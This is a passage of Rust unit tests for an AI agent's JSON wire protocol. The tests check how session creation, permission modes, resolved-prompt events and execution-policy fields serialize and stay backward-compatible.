        assert_eq!(json["command"]["instructions"], "full");
        let back: RequestEnvelope = serde_json::from_value(json).unwrap();
        assert_eq!(back.command, full);

        let legacy: RequestEnvelope = serde_json::from_value(serde_json::json!({
            "protocol_version": 1,
            "request_id": "r",
            "command": {"type": "session_create", "model": "m", "cwd": "/tmp"}
        }))
        .unwrap();
        let Command::SessionCreate { instructions, .. } = &legacy.command else {
            panic!("session_create decodes");
        };
        assert_eq!(*instructions, None);
        assert_eq!(instructions.unwrap_or_default(), SessionInstructions::Bare);
        let wire = serde_json::to_value(&legacy).unwrap();
        assert!(wire["command"].get("instructions").is_none(), "{wire}");
        assert_eq!(capabilities::SESSION_INSTRUCTIONS, "session_instructions");
    }

    /// A question or approval settled without this window's answer (another
    /// window, the 5-minute timer, a stopped run) is announced, so no window
    /// keeps a prompt that means nothing. Only an automatic choice names the
    /// answer; the others stay bare on the wire.
    #[test]
    fn request_resolved_names_how_a_prompt_ended() {
        let auto = Event::RequestResolved(RequestResolved {
            request_id: "q-1".into(),
            outcome: RequestOutcome::AutoContinued,
            answer: Some("Postgres".into()),
        });
        let value = serde_json::to_value(&auto).unwrap();
        assert_eq!(
            value,
            serde_json::json!({
                "type": "request_resolved",
                "request_id": "q-1",
                "outcome": "auto_continued",
                "answer": "Postgres"
            })
        );
        assert_eq!(serde_json::from_value::<Event>(value).unwrap(), auto);

        for outcome in [RequestOutcome::Answered, RequestOutcome::Withdrawn] {
            let event = Event::RequestResolved(RequestResolved {
                request_id: "a-1".into(),
                outcome,
                answer: None,
            });
            let value = serde_json::to_value(&event).unwrap();
            assert!(value.get("answer").is_none(), "{value}");
            assert_eq!(serde_json::from_value::<Event>(value).unwrap(), event);
        }

        // A later build's outcome still reads as settled, not as garbage.
        let later: Event = serde_json::from_value(serde_json::json!({
            "type": "request_resolved",
            "request_id": "q-3",
            "outcome": "expired"
        }))
        .unwrap();
        let Event::RequestResolved(later) = later else {
            panic!("request_resolved decodes to the typed variant");
        };
        assert_eq!(later.outcome, RequestOutcome::Unknown);
    }

    /// R1.3/R6.3 on the wire: a session is created with the window's
    /// permission mode, named as the window names it. Additive: a create
    /// from before the field decodes unchanged, and an unset mode stays off
    /// the wire.
    #[test]
    fn session_create_carries_the_permission_mode_and_stays_additive() {
        let create = Command::SessionCreate {
            session_id: Some("s1".into()),
            model: "anthropic:claude".into(),
            cwd: "/tmp/p".into(),
            system_prompt: None,
            reasoning: None,
            execution_policy: None,
            mcp_servers: Vec::new(),
            context: None,
            permission_mode: Some("accept-edits".into()),
            instructions: None,
        };
        let json = serde_json::to_value(RequestEnvelope::new("r", create.clone())).unwrap();
        assert_eq!(json["command"]["permission_mode"], "accept-edits");
        let back: RequestEnvelope = serde_json::from_value(json).unwrap();
        assert_eq!(back.command, create);

        let legacy: RequestEnvelope = serde_json::from_value(serde_json::json!({
            "protocol_version": 1,
            "request_id": "r",
            "command": {"type": "session_create", "model": "m", "cwd": "/tmp/p"}
        }))
        .unwrap();
        let Command::SessionCreate {
            permission_mode, ..
        } = &legacy.command
        else {
            panic!("session_create decodes to the typed variant");
        };
        assert_eq!(*permission_mode, None);
        let bare = serde_json::to_value(&legacy).unwrap();
        assert!(bare["command"].get("permission_mode").is_none(), "{bare}");

        assert_eq!(capabilities::PERMISSION_MODES, "permission_modes");
        assert_eq!(capabilities::PROMPT_DETAILS, "prompt_details");
    }

    #[test]
    fn policy_serializes_exact_field_names() {
        let policy = ExecutionPolicy {
            allowed_tools: vec!["read".into()],
            denied_tools: vec!["shell".into()],
            sandbox_mode: SandboxMode::WorkspaceWrite,
            sandbox_config: Some(serde_json::json!({"writable_roots": ["/tmp"]})),
            allowed_domains: vec!["example.com".into()],
            interactive_approvals: false,
            interactive_questions: false,
            plugin_tools: false,
        };
        let value = serde_json::to_value(policy).unwrap();
        assert_eq!(value["allowed_tools"][0], "read");
        assert_eq!(value["denied_tools"][0], "shell");
        assert_eq!(value["sandbox_mode"], "workspace_write");
        assert_eq!(value["allowed_domains"][0], "example.com");
        assert!(
            value.get("plugin_tools").is_none(),
            "off stays off the wire"
        );
    }

    /// Asking for plugin tools is additive: a policy from before the field
    /// asks for none, and one that asks says so in plain words.
    #[test]
    fn plugin_tools_are_asked_for_explicitly() {
        let legacy: ExecutionPolicy =
            serde_json::from_value(serde_json::json!({"sandbox_mode": "disabled"})).unwrap();
        assert!(!legacy.plugin_tools);
        let asking = ExecutionPolicy {
            plugin_tools: true,
            ..ExecutionPolicy::default()
        };
        let value = serde_json::to_value(&asking).unwrap();
        assert_eq!(value["plugin_tools"], true);
        assert_eq!(
            serde_json::from_value::<ExecutionPolicy>(value).unwrap(),
            asking
        );
        assert_eq!(capabilities::PLUGIN_CAPABILITIES, "plugin_capabilities");
    }
}
